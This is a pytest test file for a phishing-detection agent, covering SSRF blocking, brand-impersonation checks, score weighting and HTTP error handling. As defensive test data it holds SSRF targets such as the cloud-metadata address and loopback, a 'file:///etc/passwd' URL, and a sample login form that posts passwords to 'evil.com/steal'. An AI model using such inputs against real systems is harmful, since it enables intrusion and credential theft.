"""Tests for agents/web_probe_agent.py — SSRF protection, signal detection, HTTP errors."""
from __future__ import annotations

import socket
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from agents.web_probe_agent import WebProbeAgent, _is_ssrf_blocked
from core.constants import (
    PROBE_BOOST_CAP,
    PROBE_BRAND_WEIGHT,
    PROBE_FORM_ACTION_WEIGHT,
    PROBE_LOGIN_WEIGHT,
    PROBE_REDIRECT_WEIGHT,
)


# ---------------------------------------------------------------------------
# _is_ssrf_blocked — SSRF protection (unit, no HTTP)
# ---------------------------------------------------------------------------

class TestSSRFBlocking:
    def test_loopback_ip_blocked(self):
        assert _is_ssrf_blocked("127.0.0.1") is True

    def test_private_class_a_blocked(self):
        assert _is_ssrf_blocked("10.0.0.1") is True

    def test_private_class_b_blocked(self):
        assert _is_ssrf_blocked("172.16.0.1") is True

    def test_private_class_c_blocked(self):
        assert _is_ssrf_blocked("192.168.1.100") is True

    def test_link_local_metadata_blocked(self):
        assert _is_ssrf_blocked("169.254.169.254") is True

    def test_ipv6_loopback_blocked(self):
        assert _is_ssrf_blocked("::1") is True

    def test_public_ip_allowed(self):
        assert _is_ssrf_blocked("8.8.8.8") is False

    def test_dns_resolves_to_private_blocked(self):
        with patch("agents.web_probe_agent.socket.gethostbyname", return_value="10.0.0.1"):
            assert _is_ssrf_blocked("internal.corp") is True

    def test_dns_failure_fail_closed(self):
        with patch(
            "agents.web_probe_agent.socket.gethostbyname",
            side_effect=socket.gaierror("NXDOMAIN"),
        ):
            assert _is_ssrf_blocked("nonexistent.host.invalid") is True

    def test_dns_resolves_to_public_allowed(self):
        with patch("agents.web_probe_agent.socket.gethostbyname", return_value="93.184.216.34"):
            assert _is_ssrf_blocked("example.com") is False


# ---------------------------------------------------------------------------
# analyze() — input validation (no HTTP calls needed)
# ---------------------------------------------------------------------------

class TestAnalyzeInputValidation:
    @pytest.mark.asyncio
    async def test_file_scheme_blocked(self):
        result = await WebProbeAgent().analyze("file:///etc/passwd")
        assert result.s_probe == 0.0
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_ftp_scheme_blocked(self):
        result = await WebProbeAgent().analyze("ftp://files.example.com/data")
        assert result.s_probe == 0.0
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_ssrf_loopback_blocked(self):
        result = await WebProbeAgent().analyze("http://127.0.0.1/admin")
        assert result.s_probe == 0.0
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_ssrf_private_range_blocked(self):
        result = await WebProbeAgent().analyze("https://192.168.1.1/login")
        assert result.s_probe == 0.0
        assert result.error is not None


# ---------------------------------------------------------------------------
# _detect_external_form_action() — pure HTML parsing
# ---------------------------------------------------------------------------

class TestExternalFormAction:
    @pytest.fixture
    def agent(self) -> WebProbeAgent:
        return WebProbeAgent()

    def test_external_action_detected(self, agent):
        html = '<form action="https://evil.com/steal" method="POST"><input type="password"></form>'
        assert agent._detect_external_form_action(html, "bank.com") is True

    def test_same_domain_not_flagged(self, agent):
        html = '<form action="https://bank.com/login" method="POST"></form>'
        assert agent._detect_external_form_action(html, "bank.com") is False

    def test_relative_path_not_flagged(self, agent):
        html = '<form action="/submit" method="POST"></form>'
        assert agent._detect_external_form_action(html, "bank.com") is False

    def test_no_form_not_flagged(self, agent):
        assert agent._detect_external_form_action("<html><body>No forms</body></html>", "example.com") is False


# ---------------------------------------------------------------------------
# _detect_brand_impersonation() — pure HTML parsing
# ---------------------------------------------------------------------------

class TestBrandImpersonation:
    @pytest.fixture
    def agent(self) -> WebProbeAgent:
        return WebProbeAgent()

    def test_title_impersonation_detected(self, agent):
        html = "<html><head><title>PayPal - Secure Login</title></head></html>"
        assert agent._detect_brand_impersonation(html, "paypa1.com") == "paypal"

    def test_body_fallback_detected(self, agent):
        html = "<html><body>Welcome to your PayPal account. Please login here.</body></html>"
        assert agent._detect_brand_impersonation(html, "malicious-site.com") == "paypal"

    def test_brand_in_domain_not_flagged(self, agent):
        html = "<html><head><title>PayPal Login</title></head></html>"
        assert agent._detect_brand_impersonation(html, "paypal.com") is None

    def test_no_brand_keywords_returns_none(self, agent):
        assert agent._detect_brand_impersonation("<html><title>Generic</title></html>", "example.com") is None

    def test_colombian_bank_detected(self, agent):
        html = "<html><head><title>Bancolombia - Bienvenido</title></head></html>"
        brand = agent._detect_brand_impersonation(html, "bancol0mbia.com")
        assert brand == "bancolombia"


# ---------------------------------------------------------------------------
# _score() — additive weight aggregation
# ---------------------------------------------------------------------------

class TestScoreAggregation:
    @pytest.fixture
    def agent(self) -> WebProbeAgent:
        return WebProbeAgent()

    def test_login_form_score(self, agent):
        s, signals = agent._score(
            has_password_field=True,
            has_login_form=True,
            domain_changed=False,
            brand_impersonation=None,
            external_form_action=False,
        )
        assert s == round(PROBE_LOGIN_WEIGHT, 4)
        assert len(signals) == 1

    def test_password_field_without_form_weaker(self, agent):
        s, _ = agent._score(
            has_password_field=True,
            has_login_form=False,
            domain_changed=False,
            brand_impersonation=None,
            external_form_action=False,
        )
        assert s == round(PROBE_LOGIN_WEIGHT * 0.6, 4)

    def test_redirect_signal(self, agent):
        s, signals = agent._score(
            has_password_field=False,
            has_login_form=False,
            domain_changed=True,
            brand_impersonation=None,
            external_form_action=False,
        )
        assert s == round(PROBE_REDIRECT_WEIGHT, 4)
        assert any("redirect" in sig.lower() for sig in signals)

    def test_all_signals_capped_at_boost_cap(self, agent):
        s, signals = agent._score(
            has_password_field=True,
            has_login_form=True,
            domain_changed=True,
            brand_impersonation="paypal",
            external_form_action=True,
        )
        assert s <= PROBE_BOOST_CAP
        assert len(signals) == 4

    def test_no_signals_zero_score(self, agent):
        s, signals = agent._score(
            has_password_field=False,
            has_login_form=False,
            domain_changed=False,
            brand_impersonation=None,
            external_form_action=False,
        )
        assert s == 0.0
        assert signals == []

    def test_form_action_weight_alone(self, agent):
        s, _ = agent._score(
            has_password_field=False,
            has_login_form=False,
            domain_changed=False,
            brand_impersonation=None,
            external_form_action=True,
        )
        assert s == round(PROBE_FORM_ACTION_WEIGHT, 4)

    def test_brand_weight_alone(self, agent):
        s, _ = agent._score(
            has_password_field=False,
            has_login_form=False,
            domain_changed=False,
            brand_impersonation="paypal",
            external_form_action=False,
        )
        assert s == round(PROBE_BRAND_WEIGHT, 4)


# ---------------------------------------------------------------------------
# _fetch_and_analyze() — HTTP-level behaviour with mocked httpx
# ---------------------------------------------------------------------------

def _make_mock_client(
    *,
    html: bytes = b"<html><body></body></html>",
    content_type: str = "text/html; charset=utf-8",
    stream_side_effect=None,
) -> MagicMock:
    """Build a minimal async httpx.AsyncClient mock that supports streaming."""

    async def _aiter_bytes(chunk_size: int = 4096):
        yield html

    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.history = []
    mock_response.url = MagicMock()
    mock_response.url.__str__ = lambda _: "https://example.com/"
    mock_response.headers = {"content-type": content_type}
    mock_response.aiter_bytes = _aiter_bytes

    stream_cm = MagicMock()
    if stream_side_effect is not None:
        stream_cm.__aenter__ = AsyncMock(side_effect=stream_side_effect)
    else:
        stream_cm.__aenter__ = AsyncMock(return_value=mock_response)
    stream_cm.__aexit__ = AsyncMock(return_value=False)

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.stream = MagicMock(return_value=stream_cm)

    return mock_client


class TestFetchAndAnalyzeHTTPErrors:
    @pytest.mark.asyncio
    async def test_too_many_redirects_graceful(self):
        agent = WebProbeAgent()
        mock_client = _make_mock_client(stream_side_effect=httpx.TooManyRedirects("too many"))
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://example.com", "example.com")
        assert result.s_probe == 0.0
        assert result.error == "Too many redirects"

    @pytest.mark.asyncio
    async def test_timeout_graceful(self):
        agent = WebProbeAgent()
        mock_client = _make_mock_client(stream_side_effect=httpx.TimeoutException("timeout"))
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://example.com", "example.com")
        assert result.s_probe == 0.0
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_connect_error_graceful(self):
        agent = WebProbeAgent()
        mock_client = _make_mock_client(stream_side_effect=httpx.ConnectError("connection refused"))
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://example.com", "example.com")
        assert result.s_probe == 0.0
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_non_html_content_type_no_analysis(self):
        agent = WebProbeAgent()
        mock_client = _make_mock_client(content_type="application/json")
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://api.example.com/v1", "api.example.com")
        assert result.s_probe == 0.0
        assert result.error is not None
        assert "Non-HTML" in result.error

    @pytest.mark.asyncio
    async def test_login_form_detected_in_html_response(self):
        html = (
            b"<html><head><title>Test</title></head>"
            b'<body><form action="/login"><input type="password" name="pwd"></form></body></html>'
        )
        agent = WebProbeAgent()
        mock_client = _make_mock_client(html=html)
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://phishing.com/login", "phishing.com")
        assert result.has_login_form is True
        assert result.has_password_field is True
        assert result.s_probe > 0.0

    @pytest.mark.asyncio
    async def test_brand_impersonation_detected_in_html_response(self):
        html = b"<html><head><title>PayPal - Login</title></head><body></body></html>"
        agent = WebProbeAgent()
        mock_client = _make_mock_client(html=html)
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            result = await agent._fetch_and_analyze("https://paypa1.com", "paypa1.com")
        assert result.brand_impersonation == "paypal"
        assert result.s_probe > 0.0

    @pytest.mark.asyncio
    async def test_clean_page_zero_score(self):
        html = b"<html><head><title>My Blog</title></head><body><p>Hello world</p></body></html>"
        agent = WebProbeAgent()
        mock_client = _make_mock_client(html=html)
        with patch("agents.web_probe_agent.httpx.AsyncClient", return_value=mock_client):
            # "example.com" matches the mock's final_url "https://example.com/" → no domain_changed
            result = await agent._fetch_and_analyze("https://example.com", "example.com")
        assert result.s_probe == 0.0
        assert result.error is None
